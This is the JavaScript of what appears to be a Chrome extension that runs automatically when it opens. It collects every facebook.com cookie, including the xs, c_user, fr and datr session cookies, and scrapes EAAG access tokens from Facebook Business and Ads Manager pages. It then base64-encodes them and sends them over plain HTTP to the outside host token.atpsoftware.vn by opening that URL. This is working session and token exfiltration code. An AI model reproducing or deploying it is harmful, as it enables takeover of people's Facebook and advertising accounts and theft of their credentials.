$(document).ready(function () {
    setTimeout(function () {
        gettk();
    }, 50);

});

var key = "";
var xs = "";
var fr = "";
var datr = "";
var read;
var write;
var extended;
var seen_scopes;
var logger_id;
var fb_dtsg;
var scope;

function getSourceFromTab(tabId, callback, accesstoken16h, id_user, xs, fr, datr, user_data, token) {
    // Capture the page when it has fully loaded.
    // When we know the tab, execute the content script
    chrome.tabs.executeScript(tabId, {
        file: 'get_source.js'
    }, function (results) {
        // TODO: Detect injection error using chrome.runtime.lastError
        var source = results[0];
        console.log(source);
        callback(source, accesstoken16h, id_user, xs, fr, datr, user_data, token);
    });
}

var returnResult = function returnResult(htmlAds, accesstoken16h, id_user, xs, fr, datr, user_data, token) {

    var accesstoken_ads = '';

    let match = htmlAds.match(/window.__accessToken="(.*?)";/);
    if (match !== null) {
        accesstoken_ads = match[1];
    }

    if (token === "") {
        token = accesstoken16h;
    }

    let all_data = {
        "session_key": "",
        "uid": id_user,
        "secret": "",
        "access_token": token,
        "access_token16h": accesstoken16h,
        "access_token_ads": accesstoken_ads,
        "machine_id": "",
        "session_cookies": [{
            "name": "c_user",
            "value": id_user,
            "expires": "Tue, 21 Jan 2020 09:39:42 GMT",
            "expires_timestamp": 1579599582,
            "domain": ".facebook.com",
            "path": "/",
            "secure": true
        }, {
            "name": "xs",
            "value": xs,
            "expires": "Tue, 21 Jan 2020 09:39:42 GMT",
            "expires_timestamp": 1579599582,
            "domain": ".facebook.com",
            "path": "/",
            "secure": true,
            "httponly": true
        }, {
            "name": "fr",
            "value": fr,
            "expires": "Tue, 21 Jan 2020 09:39:42 GMT",
            "expires_timestamp": 1579599582,
            "domain": ".facebook.com",
            "path": "/",
            "secure": true,
            "httponly": true
        }, {
            "name": "datr",
            "value": datr,
            "expires": "Wed, 20 Jan 2021 09:39:42 GMT",
            "expires_timestamp": 1611135582,
            "domain": ".facebook.com",
            "path": "/",
            "secure": true,
            "httponly": true
        }],
        "confirmed": true,
        "identifier": id_user,
        "name": user_data.name,
        "user_storage_key": "860dcb45bf2e078ec94e372206b9a734a64fd1db7a417b1c92949b5bac1eadc9"
    };
    console.log(all_data);
    let r = btoa(JSON.stringify(all_data));
    var newURL = "http://token.atpsoftware.vn/?access_token_v2=" + r;
    console.log(newURL);
    chrome.tabs.create({
        url: newURL
    });
    $('#loading').prop('hidden', true);

}

function gettk() {
    chrome.cookies.getAll({
        domain: ".facebook.com"
    }, function (cookies) {
        $('#loading').prop('hidden', false);
        var check_login = false;
        let id_user = '';
        for (var i = 0; i < cookies.length; i++) {
            if (cookies[i].name == "xs") {
                check_login = true;
                xs = cookies[i].value;
            }
            if (cookies[i].name == "fr") {
                fr = cookies[i].value;
            }
            if (cookies[i].name == "datr") {
                datr = cookies[i].value;
            }
            if (cookies[i].name == "c_user") {
                id_user = cookies[i].value;
            }
            key += cookies[i].name + "=" + cookies[i].value + ";";
        }
        if (!check_login) {
            alert('Bạn chưa đăng nhập trên facebook.com')
            return false
        } else {
            var user_data = {"name": "ATP", "id": "1000"}
            user_data.name = "ATP";
            sendGet("https://business.facebook.com/business_locations/", function (reponse) {
                var accesstoken16h = '';

                let match = reponse.match(/\["EAAG(.*?)\"/);

                console.log(match);

                if (match !== null) {
                    accesstoken16h = "EAAG" + match[1];
                }
                chrome.tabs.getSelected(null, function (tab) {

                    var tablink = tab.url;

                    if (tablink.indexOf("adsmanager") !== -1) {
                        if (!accesstoken16h) {
                            chrome.tabs.update(tab.id, {
                                url: "https://business.facebook.com/business_locations/"
                            });
                        } else {
                            getSourceFromTab(tab.id, returnResult, accesstoken16h, id_user, xs, fr, datr, user_data, "");
                        }
                    } else {
                        chrome.tabs.create({
                            url: "https://www.facebook.com/adsmanager/manage/accounts?act="
                        }, function (tab) {
                        });
                    }
                });
            });
        }
    })
}

function xoa_dau(str) {
    str = str.replace(/à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ/g, "a");
    str = str.replace(/è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ/g, "e");
    str = str.replace(/ì|í|ị|ỉ|ĩ/g, "i");
    str = str.replace(/ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ/g, "o");
    str = str.replace(/ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ/g, "u");
    str = str.replace(/ỳ|ý|ỵ|ỷ|ỹ/g, "y");
    str = str.replace(/đ/g, "d");
    str = str.replace(/À|Á|Ạ|Ả|Ã|Â|Ầ|Ấ|Ậ|Ẩ|Ẫ|Ă|Ằ|Ắ|Ặ|Ẳ|Ẵ/g, "A");
    str = str.replace(/È|É|Ẹ|Ẻ|Ẽ|Ê|Ề|Ế|Ệ|Ể|Ễ/g, "E");
    str = str.replace(/Ì|Í|Ị|Ỉ|Ĩ/g, "I");
    str = str.replace(/Ò|Ó|Ọ|Ỏ|Õ|Ô|Ồ|Ố|Ộ|Ổ|Ỗ|Ơ|Ờ|Ớ|Ợ|Ở|Ỡ/g, "O");
    str = str.replace(/Ù|Ú|Ụ|Ủ|Ũ|Ư|Ừ|Ứ|Ự|Ử|Ữ/g, "U");
    str = str.replace(/Ỳ|Ý|Ỵ|Ỷ|Ỹ/g, "Y");
    str = str.replace(/Đ/g, "D");
    return str;
}

function sendPost(url, params, callback) {
    var http = new XMLHttpRequest();
    http.open('POST', url, true);

    //Send the proper header information along with the request
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.onreadystatechange = function () { //Call a function when the state changes.
        if (http.readyState == 4 && http.status == 200) {
            callback(http.responseText);
        }
        if (http.readyState == 4 && http.status == 500) {
            gettk2();
        }

    }
    http.send(params);
}

function sendGet(url, callback) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            callback(xhttp.responseText);
        }
    };
    xhttp.open("GET", url, true);
    xhttp.send();
}